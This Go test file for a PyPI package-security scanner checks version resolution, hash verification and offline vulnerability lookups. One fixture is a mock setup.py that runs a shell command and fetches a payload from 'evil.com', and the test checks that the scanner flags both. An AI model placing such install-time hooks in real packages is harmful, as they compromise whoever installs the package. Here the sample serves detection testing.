package pypi

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sairintechnologycom/pkgsafe/internal/cache"
	"github.com/sairintechnologycom/pkgsafe/internal/db"
	"github.com/sairintechnologycom/pkgsafe/internal/policy"
	rpypi "github.com/sairintechnologycom/pkgsafe/internal/registry/pypi"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

func TestScanPackage_ResolvesLatestAndScansArtifact(t *testing.T) {
	srv, tarballs := mockPyPIRegistry(t, map[string]mockPackageData{
		"example": {
			Latest: "1.0.0",
			Releases: map[string]map[string]string{
				"1.0.0": {
					"setup.py": `
import os, requests
os.system("whoami")
requests.get("http://evil.com/payload")
`,
				},
			},
		},
	})
	defer srv.Close()

	scanner := Scanner{
		Registry: rpypi.NewClient(srv.URL),
		Policy:   policy.Default(),
		CacheDir: t.TempDir(),
	}

	// Verify that the downloader gets the right tarball and extracts it
	res, err := scanner.ScanPackage("example", "")
	if err != nil {
		t.Fatal(err)
	}

	if res.Package.Version != "1.0.0" {
		t.Fatalf("expected resolved version 1.0.0, got %q", res.Package.Version)
	}

	if !res.Artifact.SetupPyPresent {
		t.Fatal("expected setup.py to be detected")
	}

	// Should flag the shell execution and network call in setup.py
	hasShellExecution := false
	hasNetworkCall := false
	for _, reason := range res.Reasons {
		if reason.ID == "pypi_setup_py_shell_execution" {
			hasShellExecution = true
		}
		if reason.ID == "pypi_setup_py_network_call" {
			hasNetworkCall = true
		}
	}

	if !hasShellExecution {
		t.Fatal("expected setup.py shell execution warning")
	}
	if !hasNetworkCall {
		t.Fatal("expected setup.py network call warning")
	}

	// Ensure the downloaded archive was verified against hash
	hash := sha256.Sum256(tarballs["example-1.0.0.tar.gz"])
	expectedHex := hex.EncodeToString(hash[:])
	actualPath, err := scanner.Registry.DownloadArtifact(srv.URL+"/tarballs/example-1.0.0.tar.gz", scanner.CacheDir)
	if err != nil {
		t.Fatal(err)
	}
	if err := rpypi.VerifyArtifactHash(actualPath, map[string]string{"sha256": expectedHex}); err != nil {
		t.Fatalf("hash verification failed: %v", err)
	}
}

func TestScanPackage_ExactVersion(t *testing.T) {
	srv, _ := mockPyPIRegistry(t, map[string]mockPackageData{
		"example": {
			Latest: "2.0.0",
			Releases: map[string]map[string]string{
				"1.0.0": {
					"pyproject.toml": `
[build-system]
build-backend = "setuptools.build_meta"
`,
				},
				"2.0.0": {
					"pyproject.toml": `
[build-system]
build-backend = "poetry.core.masonry.api"
`,
				},
			},
		},
	})
	defer srv.Close()

	scanner := Scanner{
		Registry: rpypi.NewClient(srv.URL),
		Policy:   policy.Default(),
		CacheDir: t.TempDir(),
	}

	res, err := scanner.ScanPackage("example", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	if res.Package.Version != "1.0.0" {
		t.Fatalf("expected version 1.0.0, got %q", res.Package.Version)
	}
}

func TestScanPackage_OfflineVulnerabilityLookup(t *testing.T) {
	// Store package scan result in local cache
	store, err := cache.Load("")
	if err != nil {
		t.Fatal(err)
	}
	mockRes := types.ScanResult{
		Package:  types.PackageIdentity{Ecosystem: "pypi", Name: "pandas", Version: "2.1.0"},
		Decision: types.DecisionAllow,
	}
	_ = store.Put(mockRes)

	tempDir := t.TempDir()
	dbPath := filepath.Join(tempDir, "pkgsafe.db")
	d, err := db.Open(dbPath)
	if err != nil {
		t.Fatal(err)
	}

	ctx := context.Background()
	vuln := db.Vulnerability{
		ID:          "GHSA-pandas-1",
		Ecosystem:   "PyPI",
		PackageName: "pandas",
		Summary:     "Mock Pandas Vulnerability",
		Severity:    "high",
		AffectedRanges: []db.Range{
			{
				Type: "SEMVER",
				Events: []db.Event{
					{Introduced: "0", Fixed: "2.2.0"},
				},
			},
		},
		FixedVersions: []string{"2.2.0"},
		Source:        "OSV",
		FetchedAt:     time.Now(),
	}
	_ = d.SaveVulnerabilities(ctx, []db.Vulnerability{vuln})
	d.Close()

	scanner := Scanner{
		Policy:  policy.Default(),
		Offline: true,
		DBPath:  dbPath,
	}

	res, err := scanner.scanOffline(ctx, "pandas", "2.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}

	if res.Decision != types.DecisionWarn {
		t.Fatalf("expected decision to be warn due to vulnerability, got %s", res.Decision)
	}
	if len(res.Vulnerabilities) != 1 || res.Vulnerabilities[0].ID != "GHSA-pandas-1" {
		t.Fatalf("expected GHSA-pandas-1 vulnerability, got %v", res.Vulnerabilities)
	}
}

type mockPackageData struct {
	Latest   string
	Releases map[string]map[string]string
}

func mockPyPIRegistry(t *testing.T, pkgs map[string]mockPackageData) (*httptest.Server, map[string][]byte) {
	t.Helper()
	tarballs := map[string][]byte{}
	for pkgName, data := range pkgs {
		for version, files := range data.Releases {
			tarballKey := pkgName + "-" + version + ".tar.gz"
			tarballs[tarballKey] = makeTarGz(t, files)
		}
	}

	mux := http.NewServeMux()
	var srv *httptest.Server

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		parts := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
		if len(parts) >= 2 && parts[1] == "json" {
			packageName := parts[0]
			data, ok := pkgs[packageName]
			if !ok {
				http.NotFound(w, r)
				return
			}
			md := rpypi.Metadata{
				Info: rpypi.Info{
					Name:    packageName,
					Version: data.Latest,
				},
				Releases: map[string][]rpypi.File{},
			}
			for version := range data.Releases {
				tarballKey := packageName + "-" + version + ".tar.gz"
				tb := tarballs[tarballKey]
				hash := sha256.Sum256(tb)
				md.Releases[version] = []rpypi.File{
					{
						Filename:    tarballKey,
						PackageType: "sdist",
						URL:         srv.URL + "/tarballs/" + tarballKey,
						Size:        int64(len(tb)),
						Digests:     map[string]string{"sha256": hex.EncodeToString(hash[:])},
					},
				}
			}
			_ = json.NewEncoder(w).Encode(md)
			return
		}
		http.NotFound(w, r)
	})

	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
		filename := filepath.Base(r.URL.Path)
		b, ok := tarballs[filename]
		if !ok {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(b)
	})

	srv = httptest.NewServer(mux)
	return srv, tarballs
}

func makeTarGz(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, content := range files {
		hdr := &tar.Header{
			Name: name,
			Mode: 0644,
			Size: int64(len(content)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func makeZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		f, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := f.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}
